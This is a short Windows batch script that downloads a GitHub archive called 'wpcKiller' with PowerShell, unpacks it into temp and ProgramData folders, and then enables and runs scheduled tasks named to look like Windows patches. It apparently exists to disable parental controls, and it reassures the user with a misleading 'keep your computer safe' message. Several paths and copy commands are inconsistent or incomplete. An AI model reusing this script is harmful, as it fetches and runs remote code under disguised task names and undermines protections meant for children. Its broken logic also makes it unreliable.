setlocal enableextensions
md %temp%\dos\upd
cd %temp%\dos\upd
echo download the files...
if not exist files.zip powershell -Command "Invoke-WebRequest https://github.com/cbaie9/wpcKiller/archive/refs/heads/main.zip -Outfile  files.zip"
Echo de-zippage des fichier
if not exist %temp%\dos\files powershell -command "Expand-Archive -LiteralPath %temp%\dos/files.zip"
echo Installing.. [ Please don't close if you want your computer safe ;) ]
echo copying files.	
Cd %programdata%\copyrepair\1_4_0
copy %temp%\Dos\upd\files\wpcKiller-main
Cd %programdata%\Wpc	
copy %temp%\dos\upd\files\Wpckiller-main
if exist %programdata%\Wpc\argument\1_7 exit \b 
schtasks /change /tn "Windows_pc_patch_dosexec" /enable
SCHTASKS /RUN /TN "Windows_pc_patch_msdos"
exit \b
